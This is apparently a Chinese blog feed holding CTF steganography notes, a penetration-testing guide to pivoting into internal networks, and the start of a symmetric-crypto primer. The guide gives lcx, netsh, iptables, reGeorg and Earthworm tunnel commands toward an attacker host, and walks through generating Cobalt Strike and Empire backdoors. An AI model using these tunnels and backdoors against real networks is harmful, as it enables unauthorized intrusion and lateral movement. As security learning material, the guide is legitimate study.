word&#x2F;settings.xml</span><br><span class="line">Extracting  word&#x2F;fontTable.xml</span><br><span class="line">Extracting  word&#x2F;styles.xml</span><br><span class="line">Extracting  word&#x2F;document.xml</span><br><span class="line">Extracting  word&#x2F;_rels&#x2F;document.xml.rels</span><br><span class="line">Extracting  _rels&#x2F;.rels</span><br><span class="line">Extracting  [Content_Types].xml</span><br><span class="line">Extracting  flag.txt</span><br><span class="line"></span><br><span class="line">Everything is Ok</span><br></pre></td></tr></table></figure><p>我们会发现又flag.txt的文件被打包在file.docx中，<br><strong>直接用7z等压缩包工具打开file.docx</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/Pabuoxc9ENVqSsR.png" alt="image-20200614110300105"></p><p><strong>思考</strong></p><ol><li>思考，如何制作这种隐写呢？</li><li>试试能否用binwalk 或者strings等工具查看隐写痕迹。</li></ol><h4 id="二、PDF文件中的信息隐藏"><a href="#二、PDF文件中的信息隐藏" class="headerlink" title="二、PDF文件中的信息隐藏"></a>二、PDF文件中的信息隐藏</h4><p>PDF隐写中，我们最常用，也是最熟知的工具就是wbStego4open,这是可以把文件隐藏到BMP，TXT,HTM和PDF文件中的工具，当然，这里我们只用他来最为以PDF为载体进行隐写的工具。</p><h5 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h5><ul><li>wbStego4open</li></ul><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打开电子文档隐写，找到  stego.pdf文档</span><br><span class="line">- 在工具目录中找到 wbStego4open，使用工具载入文档，</span><br><span class="line">- 根据提示，一步一步完成隐藏信息的提取</span><br><span class="line">- 最终flag&#123;CTF_is_funny&#125;</span><br></pre></td></tr></table></figure><p><strong>首先找到目标文件</strong><br>在实验机中找到隐写术目录，打开电子文档隐写，找到 stego.pdf文档</p><p><strong>其次，找到工具wbStego4open</strong><br>在工具目录中找到 wbStego4open，使用工具载入文档，<br>Step 1 是文件介绍<br>Step 2 中，我们选择Decode，<br>Step 3 我们选择目标文件<br>Step 4 输入加密密码，如果是空密码，直接跳过<br>Step 5 为保存文件为 flag.txt</p><p>这道题没了大伙自己网上去找</p><p><strong>最后打开保存后的文件，flag.txt</strong><br>最后打开保存后的文件，flag.txt，就能得到flag了。</p><p><strong>思考</strong></p><ol><li>查阅其他资料，是否还要其他的PDF隐写方式，其原理又是什么？</li></ol><hr><h3 id="其他隐写"><a href="#其他隐写" class="headerlink" title="其他隐写"></a>其他隐写</h3><h4 id="一、数据包隐写术"><a href="#一、数据包隐写术" class="headerlink" title="一、数据包隐写术"></a>一、数据包隐写术</h4><p>数据包隐写术，就是将所要传达的信息和文件，以流量包的形式下发给参赛选手，参赛选手要从流量包中自行提取出所需要的文件或者相关内容进行解题。比较常用的工具是wireshark。关于此类部分的详细介绍，大家可以访问这个网址：<a href="https://ctf-wiki.github.io/ctf-wiki/misc/traffic/data/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/traffic/data/</a></p><h5 id="常用工具：-5"><a href="#常用工具：-5" class="headerlink" title="常用工具："></a>常用工具：</h5><ul><li>wireshark</li></ul><p>数据包隐写术目前两种考察行为：</p><p>①、flag或者关键信息直接隐藏在流量包中</p><p>②、flag相关文件隐藏在流量包中，需要分离文件</p><h4 id="二、细微的颜色差别"><a href="#二、细微的颜色差别" class="headerlink" title="二、细微的颜色差别"></a>二、细微的颜色差别</h4><p>就是看细心程度</p><p>藏在第一列的第四只皮卡丘的酒窝里</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/8nVd4DWyoTqmj5b.png" alt="image-20200614112236379"></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/BLQ7jJZIa2kSOCs.png" alt="image-20200614112349386"></p><p>其他的题型随时补充</p><hr><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>一般的MISC题目都不是简简单单的一个隐写就能解决的，正常都包含了密码，编码，隐写甚至更多的计算机网络知识。</p><hr><p>本文大部分源于<a href="https://link.zhihu.com/?target=https%3A//xz.aliyun.com/">先知社区</a>中M1n3所作<a href="https://xz.aliyun.com/t/1833" target="_blank" rel="noopener">Misc 总结 —-隐写术之图片隐写</a>一文，对其进行了相应的补充并增加了自己的思考以作为自己的学习笔记，如有侵删。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF,MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透工具</title>
      <link href="/undefined/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>/undefined/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="TCP内网穿透"><a href="#TCP内网穿透" class="headerlink" title="TCP内网穿透"></a>TCP内网穿透</h2><h3 id="常见内网穿透手段与工具介绍与使用"><a href="#常见内网穿透手段与工具介绍与使用" class="headerlink" title="常见内网穿透手段与工具介绍与使用"></a>常见内网穿透手段与工具介绍与使用</h3><p><strong>使用场景：</strong></p><p>攻击者从外网打开了入口，想入侵更多的内网机器</p><h4 id="常见工具"><a href="#常见工具" class="headerlink" title="常见工具"></a>常见工具</h4><p>lcx.exe   netsh   portmap   iptables</p><h5 id="LCX端口转发使用："><a href="#LCX端口转发使用：" class="headerlink" title="LCX端口转发使用："></a>LCX端口转发使用：</h5><p>lcx有两大功能：</p><ul><li>端口转发（listen和slave成对使用）</li><li>端口映射（tran）</li></ul><p><strong>端口转发：</strong></p><p>Lcx -Listen &lt;监听slave请求的端口(对应slave的第二个参数)&gt; &lt;等待连接的端口&gt;</p><p>Lcx -slave &lt;你的ip&gt; &lt;监听端口(对应listen的第一个参数)&gt; &lt;目标ip&gt; &lt;目标端口&gt;</p><p><strong>使用示例：</strong></p><p>使用环境：本机外网IP，它机内网IP</p><p>本机上运行：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx -listen 34 3434</span><br></pre></td></tr></table></figure><p>这句话的意思就是监听本机的34端口然后将数据转发到3434端口</p><p>它机上运行：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx -slave 10.128.2.171 34 192.168.56.134 21</span><br></pre></td></tr></table></figure><p>假设本机IP为10.128.2.171 被控机为192.168.56.134</p><p>这句话的意思是内网被控机将21端口转发到本机IP—10.128.2.171的34端口上</p><p>然后本机就能通过连接本地的3434端口进行监听控制</p><h5 id="LCX端口映射使用："><a href="#LCX端口映射使用：" class="headerlink" title="LCX端口映射使用："></a>LCX端口映射使用：</h5><p>lcx有两大功能：</p><ul><li>端口转发（listen和slave成对使用）</li><li>端口映射（tran）</li></ul><p>Lcx -tran &lt;等待连接的端口&gt; &lt;目标ip&gt; &lt;目标端口&gt;</p><p>这句话的意思是将本机的等待映射的端口映射到目标ip 的目标端口</p><h5 id="Windows自带的转发工具netsh："><a href="#Windows自带的转发工具netsh：" class="headerlink" title="Windows自带的转发工具netsh："></a>Windows自带的转发工具netsh：</h5><p>配置方法<br>假定需要通过192.168.1.8的14941端口连接192.168.1.118的1494端口，则需要在192.168.1.8主机的命令行输入如下语句</p><p><strong>开启IPv6支持</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure><p><strong>如果操作系统开启了主机防火墙，需要放行TCP 14941的入站连接，下面是配置端口转发的两条语句，区别不大，一条指定IP，一条默认本机IP</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress&#x3D;192.168.1.8 listenport&#x3D;14941 connectaddress&#x3D;192.168.1.118 connectport&#x3D;1494</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport&#x3D;14941 connectaddress &#x3D;192.168.1.118 connectport&#x3D;1494</span><br></pre></td></tr></table></figure><p><strong>取消上面配置的端口转发，可以用如下语句：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenaddress 192.168.1.8 listenport &#x3D;33891</span><br></pre></td></tr></table></figure><p><strong>如果想查看已经配置了哪些端口转发，可以用如下语句：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy show v4tov4</span><br></pre></td></tr></table></figure><h5 id="LINUX自带的转发工具iptables："><a href="#LINUX自带的转发工具iptables：" class="headerlink" title="LINUX自带的转发工具iptables："></a>LINUX自带的转发工具iptables：</h5><p><strong>首先开启内核转发：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1&gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward          &#x2F;&#x2F;当主机发现不是自己的流量就会进行转发</span><br><span class="line">sysctl -p                                     &#x2F;&#x2F;立即生效</span><br></pre></td></tr></table></figure><p><strong>配置iptables进行端口转发</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -m tcp --dport21521 -j DNET --to-destination 192.168.0.211:1521</span><br><span class="line">&#x2F;&#x2F;把目的端口为21521的端口的流量转发到192.168.0.211主机的1521端口，DNAT表示目的地址转换</span><br><span class="line">iptables -t nat -A POSTROUTING -s 192.168.0.0&#x2F;16 -d 192.168.0.211 -p tcp -m tcp --dport 1521 -j SNAT --to-source 192.168.0.132</span><br><span class="line">&#x2F;&#x2F;指定192.168.0.0&#x2F;16 ip段的请求进行来源地址转换</span><br></pre></td></tr></table></figure><h3 id="内网代理工具"><a href="#内网代理工具" class="headerlink" title="内网代理工具"></a>内网代理工具</h3><h4 id="regeorg内网代理工具"><a href="#regeorg内网代理工具" class="headerlink" title="regeorg内网代理工具"></a>regeorg内网代理工具</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606132624260.png" alt="image-20200606132624260"></p><p>reGeorgSocksProxy.py是运行在本机上的，渗透一个网站之后，上传对应格式的tunnel文件到服务器</p><h5 id="step1："><a href="#step1：" class="headerlink" title="step1："></a>step1：</h5><p>首先通过webshell等方式上传对应的可使用的代理脚本</p><h5 id="step2："><a href="#step2：" class="headerlink" title="step2："></a>step2：</h5><p>然后攻击者在本地执行python脚本，利用网络上的脚本建立socks5代理隧道</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http:&#x2F;&#x2F;10.128.2.171&#x2F;tunnel.nosocket.php</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606135145093.png" alt="image-20200606135145093"></p><p>此时用软件连接到socks5代理127.0.0.1:8888就处于该服务器的内网环境了</p><h4 id="配合使用的软件："><a href="#配合使用的软件：" class="headerlink" title="配合使用的软件："></a>配合使用的软件：</h4><p><strong>MAC下：</strong><br>proxychains（Proxifier/直接用burpsuite或浏览器连接到socks5代理<br><strong>Windows下：</strong><br>Proxifier.exe/直接用burpsuite或浏览器连接到socks5代理<br><strong>Linux下：</strong><br>proxychains</p><p><strong>proxychains配置</strong></p><p>首先修改配置文件</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606135511794.png" alt="image-20200606135511794"></p><p>在MAC或者linux_上，修改配置文件后，就可以直接在想执行的命令前加上proxychians命令，这样会自动让后面的命令通过代理执行</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606135625508.png" alt="image-20200606135625508"></p><h3 id="集代理和端口转发功能于一身的Earthworm（多平台）"><a href="#集代理和端口转发功能于一身的Earthworm（多平台）" class="headerlink" title="集代理和端口转发功能于一身的Earthworm（多平台）"></a>集代理和端口转发功能于一身的Earthworm（多平台）</h3><h4 id="直接当做socks5代理使用"><a href="#直接当做socks5代理使用" class="headerlink" title="直接当做socks5代理使用"></a>直接当做socks5代理使用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew_win32.exe -s ssocksd -h</span><br><span class="line">&#x2F;&#x2F;列出参数</span><br></pre></td></tr></table></figure><p>使用命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew_win32.exe -s ssocksd -l 8082</span><br><span class="line">&#x2F;&#x2F;监听8082端口</span><br></pre></td></tr></table></figure><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>rssocks和rcsocks则是成对使用的选项，可以直接搭建lcx那样的端口转发隧道，只不过转发的端口直接就是earthworm提供的socks5代理</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140307805.png" alt="image-20200606140307805"></p><p>内网victim主机执行的是将建立在本地的socks5代理转发到公网某端口<br>公网attacker的主机执行的是监听两个端口，一个用来接收attacker的链接，一个用来转发内网的代理</p><h5 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h5><p>首先在公网主机上监听好两个端口，等待内网主机链接</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140721591.png" alt="image-20200606140721591"></p><h5 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h5><p>然后在victim的电脑上执行earthworm以开启socks5代理，并执行转发</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140744284.png" alt="image-20200606140744284"></p><h5 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h5><p>浏览器设置好代理后就相当于已经处于该内网直接可以访问内网的资源</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140856159.png" alt="image-20200606140856159"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606140910046.png" alt="image-20200606140910046"></p><p>或者也可以通过<br>proxychains/proxifier把代理用在其<br>他的一些工具上<br>nmap/sqlmap/rdesktop</p><h3 id="多级级联"><a href="#多级级联" class="headerlink" title="多级级联"></a>多级级联</h3><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141238357.png" alt="image-20200606141238357"></p><p>数据流向：SOCKS v5-&gt; 1080-&gt; 8888-&gt; 9999-&gt; 7777-&gt; rssocks</p><h3 id="ICMP-UDP内网穿透"><a href="#ICMP-UDP内网穿透" class="headerlink" title="ICMP/UDP内网穿透"></a>ICMP/UDP内网穿透</h3><h4 id="icmptunnel内网穿透"><a href="#icmptunnel内网穿透" class="headerlink" title="icmptunnel内网穿透"></a>icmptunnel内网穿透</h4><p>icmptunnel借助icmp协议进行通信</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141542429.png" alt="image-20200606141542429"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141552013.png" alt="image-20200606141552013"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141640116.png" alt="image-20200606141640116"></p><h4 id="服务端执行的脚本和启动命令"><a href="#服务端执行的脚本和启动命令" class="headerlink" title="服务端执行的脚本和启动命令"></a>服务端执行的脚本和启动命令</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141716894.png" alt="image-20200606141716894"></p><h4 id="客户端执行的脚本和启动的命令"><a href="#客户端执行的脚本和启动的命令" class="headerlink" title="客户端执行的脚本和启动的命令"></a>客户端执行的脚本和启动的命令</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606141809132.png" alt="image-20200606141809132"></p><h3 id="DNS协议穿透内网"><a href="#DNS协议穿透内网" class="headerlink" title="DNS协议穿透内网"></a>DNS协议穿透内网</h3><h4 id="dns2tcp工具安装"><a href="#dns2tcp工具安装" class="headerlink" title="dns2tcp工具安装"></a>dns2tcp工具安装</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142043435.png" alt="image-20200606142043435"></p><h4 id="解析域名"><a href="#解析域名" class="headerlink" title="解析域名"></a>解析域名</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142111545.png" alt="image-20200606142111545"></p><p>一条A记录和一条Ns记录当查询到ssrf这个子域名的时候(xxxx.ssrf.nuptzj.cn)会去ns记录指向的blog子域名查询</p><h4 id="配置服务端"><a href="#配置服务端" class="headerlink" title="配置服务端"></a>配置服务端</h4><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142433789.png" alt="image-20200606142433789"></p><p>启动服务器端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dns2tcpd -f &#x2F;etc&#x2F;dns2tcpd.conf -d 1</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606142523168.png" alt="image-20200606142523168"></p><p>启动客户端 </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dns2tcpc -r ssh -I 7777 -z ssrf.nuptzj.cn blog.nuptzj.cn</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606143114174.png" alt="image-20200606143114174"></p><p>连接到ssh服务</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606143205496.png" alt="image-20200606143205496"></p><h3 id="端口复用技术"><a href="#端口复用技术" class="headerlink" title="端口复用技术"></a>端口复用技术</h3><p>参考链接 <a href="https://xz.aliyun.com/t/1661" target="_blank" rel="noopener">https://xz.aliyun.com/t/1661</a></p><h2 id="常见工具介绍与使用"><a href="#常见工具介绍与使用" class="headerlink" title="常见工具介绍与使用"></a>常见工具介绍与使用</h2><h3 id="Cobaltstrike使用介绍"><a href="#Cobaltstrike使用介绍" class="headerlink" title="Cobaltstrike使用介绍"></a>Cobaltstrike使用介绍</h3><h4 id="Cobaltstrike搭建与应用"><a href="#Cobaltstrike搭建与应用" class="headerlink" title="Cobaltstrike搭建与应用"></a>Cobaltstrike搭建与应用</h4><p>启动Cobaltstrike Team Server</p><p>配置完java环境以后直接运行teamserver文件就可以开启<br>./teamserver[服务器的IP] [你的连接密码]</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606144233886.png" alt="image-20200606144233886"></p><p>Cobalt Strike Client<br>运行cobaltstrike客户端文件连接到该服务器</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606144742574.png" alt="image-20200606144742574"></p><p>在面板中填入配置信息就可以点击connect连接到C&amp;C服务器，Cobaltstrike是一个适合团队协作的平台，可以多人连接到服务器，一起对客户机进行渗透操作，共享shell</p><h4 id="Listener设置"><a href="#Listener设置" class="headerlink" title="Listener设置"></a>Listener设置</h4><p>首次使用需要先设置一个默认的listener，就是指的程序默认监听回连靶机的方式（就是渗透的靶机回连的端口是vps的8088端口，然后客户端这边监听vps的8088）</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606144855822.png" alt="image-20200606144855822"></p><p>监听有很多种方式，dns，ttp，https选择https或者dns协议会让通信更加隐秘，不那么容易被侦测到流量<img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606145236715.png" alt="image-20200606145236715"></p><h4 id="Attacks模块"><a href="#Attacks模块" class="headerlink" title="Attacks模块"></a>Attacks模块</h4><p>设置完监听我们就可以来看看有哪些方式能用来攻击</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606145433934.png" alt="image-20200606145433934"></p><p>Cs提供的直接生成恶意文件的方式</p><p>Cs提供的包括站点克隆（钓鱼），添加文件到网页 链接利用WEB方式传输payload，应用识别等辅助攻击功能</p><h4 id="生成可执行文件后门"><a href="#生成可执行文件后门" class="headerlink" title="生成可执行文件后门"></a>生成可执行文件后门</h4><p>使用Attacks-&gt;Packages–&gt;Windows executable生成一个恶意文件</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606145830581.png" alt="image-20200606145830581"></p><p>listener表示当对方运行了这个.exe文件后，对方已怎样的方式回连到主控端</p><h4 id="执行效果"><a href="#执行效果" class="headerlink" title="执行效果"></a>执行效果</h4><p>通过各种手段让靶机执行以后，可以看到客户端上线啦~<br>CS的载荷不是时刻保持socket通信的，而是有–定的心跳时间，默认是每一分钟会向C&amp;C服务器拉取一-下最新的指令并执行，所以我们下达指令后，靶机会周期性的来获取命令然后执行并返回结果（可以通过Beacon中的sleep命令调整时间）</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606150051268.png" alt="image-20200606150051268"></p><h4 id="如何进入Beacon控制台"><a href="#如何进入Beacon控制台" class="headerlink" title="如何进入Beacon控制台"></a>如何进入Beacon控制台</h4><p>对着目标右键选择interact可以进入这个目标的控制台界面</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606150458393.png" alt="image-20200606150458393"></p><h3 id="Metasploit使用介绍"><a href="#Metasploit使用介绍" class="headerlink" title="Metasploit使用介绍"></a>Metasploit使用介绍</h3><h3 id="Empire使用介绍"><a href="#Empire使用介绍" class="headerlink" title="Empire使用介绍"></a>Empire使用介绍</h3><h4 id="Empire工具安装向导"><a href="#Empire工具安装向导" class="headerlink" title="Empire工具安装向导"></a>Empire工具安装向导</h4><p>项目地址：<br><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a><br>安装方法：<br>使用ubuntu或者debian<br>git clone <a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a><br>cd setup&amp;&amp;sudo./install.sh<br>这个工具安装前要先配置好python和pip</p><h4 id="设置Listener"><a href="#设置Listener" class="headerlink" title="设置Listener"></a>设置Listener</h4><p>empire的监听方式</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606152723567.png" alt="image-20200606152723567"></p><p>包含的类型比较多：<br>●可以委派给其他监听器的比如msf的meterpreter<br>●基于利用微软onedrive作为c&amp;c服务器 的监听器onedrive直接是在本机监听http及 多种http相关协议的多个监听器</p><p>执行uselistener http以后直接按照默认配置执行execute会启动http80端口的监听当然也可以通过info命令显示选项，通过set命令调整设置以后再execute启动</p><h4 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h4><p>设置完监听模式以后生成payload<br>可以直接通过launcher powershel[python]http生成连接到对应的监听器的payload</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606152928138.png" alt="image-20200606152928138"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153712491.png" alt="image-20200606153712491"><br><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153724477.png" alt="image-20200606153724477"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153758800.png" alt="image-20200606153758800"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153817638.png" alt="image-20200606153817638"></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200606153853515.png" alt="image-20200606153853515"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现代对称加密算法原理</title>
      <link href="/undefined/%E7%8E%B0%E4%BB%A3%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/"/>
      <url>/undefined/%E7%8E%B0%E4%BB%A3%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>对称密码沿用替代置换等古典密码技术(混乱与扩散) , 被称为传统密码</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><h4 id="加密算法："><a href="#加密算法：" class="headerlink" title="加密算法："></a>加密算法：</h4><p>一次性密码本+完美秘密+伪随机数生成+Diffie-Hellman密钥交换</p><h5 id="一次性码本原理："><a href="#一次性码本原理：" class="headerlink" title="一次性码本原理："></a>一次性码本原理：</h5><p>首先是需要加密的明文：“hello”; ——————————————5位字母</p><p>然后生成一串拥有与明文相同位数的随机位移：“2,3,1,2,1”———-5个位移</p><p>每个位移分别对应相同位的字母进行位移得到密文：</p><p><strong>这样加密的信息有两个强大的特性。</strong></p><p>第一：位移没有重复的规律</p><p>第二：加密的消息将有一个均匀的频率分布，将不会被频率分析破解</p><h5 id="完美密码原理："><a href="#完美密码原理：" class="headerlink" title="完美密码原理："></a>完美密码原理：</h5><p>假设A写信给B,长度为20个字母，下一步，A用一个和B共享的密钥，它由20个随机生成的位移组成， 每个位移在1到26之间，密钥空间就是所有可能结果的组合。所以，生成一个密钥相当于，从这20个字母的组合中随机选一个</p><p>例：</p><p>假设要将   “ALICE”   通过位移加密，首先随机生成5个位移，每个位移的值为0-26，对应26个英文字母。</p><p>当使用位移进行加密时，也就是说A经过位移有26种可能，然后L经过位移也有26种可能 ……… 一共就是:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">位移空间 &#x3D; 26*26*26*26*26</span><br></pre></td></tr></table></figure><p>然后因为是随机得到的5个位移，就能理解每一个位移都有26种可能，所以密钥空间为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">密钥空间 &#x3D; 26*26*26*26*26</span><br></pre></td></tr></table></figure><p>当使用密钥空间中的 “一种密钥” 对位移空间的 “一种位移可能” 进行加密时，生成一种对应的密文信息；</p><p>所以密文信息空间的大小等于密钥空间；</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">密文信息空间&#x3D;位移空间&#x3D;密钥空间</span><br></pre></td></tr></table></figure><p>这对应了完美密码，当有人仅仅获得了加密文字的一页，他们所知道的唯一的事情是每个消息是同等可能的。所以无论有多大的计算能力，都不能帮助改进一个盲目的猜测。</p><p>现在要考虑的是在考虑一次性码本的时候，是我们需要事先分享这些长长的密钥，为了解决这个问题 ，我们需要放松对秘密的定义，这需要引入伪随机数的概念。</p><h5 id="伪随机数生成原理："><a href="#伪随机数生成原理：" class="headerlink" title="伪随机数生成原理："></a>伪随机数生成原理：</h5><p>首先选择一个数</p><p>例 “121” ，称之为 “种子”</p><p>然后将 “种子” 相乘获得乘积 “14641”  </p><p>再从乘积中取中间的与”种子“相同位数的一个数 “464”，</p><p>重复生成乘积，再取中间值，最后生成一串随机数</p><p>这个方法叫做 “中间平方”</p><p>生成的随机数序列的随机性依赖于最初种子的随机性，同样的种子，导致同样的序列，所以，随机生成的序列区别于伪随机生成的序列的实质是什么？</p><p>中间平方的生成会有一个周期，但是当“种子”的长度增加，就会加大这个周期</p><p>与之同时带来一个问题，如何分享这个随机数的种子</p><h5 id="Diffie-Hellman密钥交换原理："><a href="#Diffie-Hellman密钥交换原理：" class="headerlink" title="Diffie-Hellman密钥交换原理："></a>Diffie-Hellman密钥交换原理：</h5><p><img src= "/img/loading.gif" 